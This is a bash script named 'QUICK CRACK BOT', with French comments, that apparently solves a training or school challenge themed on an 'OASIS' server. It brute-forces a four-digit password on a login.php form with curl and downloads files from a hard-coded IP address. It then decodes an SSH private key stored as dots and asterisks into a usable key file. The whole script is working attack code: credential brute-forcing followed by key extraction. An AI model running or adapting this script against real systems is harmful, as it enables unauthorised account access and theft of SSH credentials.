#!/bin/bash
#######################
### QUICK CRACK BOT ###
#######################
IP_ADDRESS=""
PASSWORD=""
URL=""
LOGIN="halliday_j"
OUTPUT_DIR="./out/www"
INPUT_DIR="./out/www"
OUTFILE="./out/id_ssh"

# Get IP adress of the server to crack
getIP()
{
  IP_ADDRESS=$1
}

#######################################
### Key 1 – Crack OASIS access code ###
#######################################
getKey1()
{
  CURRENT_PASSWORD="0"
  FOUND="1"
  
  # On bruteforce le password
  echo "Trying to connect to http://$IP_ADDRESS/login.php"
  echo "Please wait..."
  while [ $CURRENT_PASSWORD -le 9999 ] && [ $FOUND -eq 1 ]
  do
    PASSWORD=$(printf "%04s" $CURRENT_PASSWORD)
    curlJob $LOGIN $PASSWORD
    CURRENT_PASSWORD=$(($CURRENT_PASSWORD + 1))  
  done
  echo "Connected!"
}
# Job de curl
curlJob()
{
  # Appel de l'url de connexion avec le login/mdp
  URL=$(curl -sw %{redirect_url} -d "login=$1&password=$2" -o /dev/null -X POST "http://$IP_ADDRESS/login.php")
  
  # Si on a une URL de redirection c'est que l'on a réussi à s'identifier
  if [ $URL ]
  then
    echo "URL:$URL"
    FOUND="0"
  fi
}
# Methode de téléchargement de tous les fichiers
downloadFile()
{
  echo "Creating output directy"
  mkdir -p $OUTPUT_DIR
  echo "Output directory created"
  echo "Start downloading files"
  for fileToDownload in $(curl -s http://163.5.245.214/etna/files/ | grep "href=.*" -o | cut -d= -f2 | cut -d\" -f2 | grep "^[a-zA-Z0-9]")
  do
    echo "Downloading $fileToDownload"
    curl -s -o $OUTPUT_DIR/$fileToDownload $URL/$fileToDownload
  done
  echo "Files downloaded!"
}

###################################
### Key 2 – Reconstruct SSH key ###
###################################
getKey2()
{ 
  echo "Searching for key file..." 
  # On recherche le fichier de clé dans le répertoire INPUT_DIR
  keyFile=$(file $INPUT_DIR/* | grep "ASCII text, with very long lines" | cut -d: -f1)
  echo "Key file found : $keyFile !"
  
  # On décode le fichier
  decodeKey $keyFile

  # On change la permission sur le fichier de clé
  chmod 700 $OUTFILE
}
# Methode pour décoder la clé
decodeKey()
{
  echo "Decoding file..."

  # On supprime le contenu du fichier de sortie
  rm $OUTFILE &> /dev/null

  # On lit le fichier ligne par ligne
  for line in $(cat $1)
  do
    decodeLine $line
  done
  echo "File decoded!"
}
decodeLine()
{
  # On récupère le paramètres d'entrée
  param=$1

  # On calcule la longueur de la clé
  size=${#param}

  # On transforme la ligne en binaire
  toDecode=$(echo $param | sed "s/\./0/g;s/\*/1/g")

  # On boucle sur la ligne pour la décoder
  cpt="0"
  key=""
  while [ $cpt -lt $size ]
  do
    # On récupère l'octet en cours
    octet=${toDecode:cpt:8}

    # On décode la ligne en transformant le binaire -> decimal -> octal -> ASCII
    key+=$(printf $(printf "\%o" $((2#${toDecode:cpt:8}))))

    # On incrémente le compteur d'un octet
    cpt=$(($cpt + 8))
  done
  echo "$key" >> $OUTFILE
}
getIP $@
getKey1 $IP_ADDRESS
downloadFile
getKey2
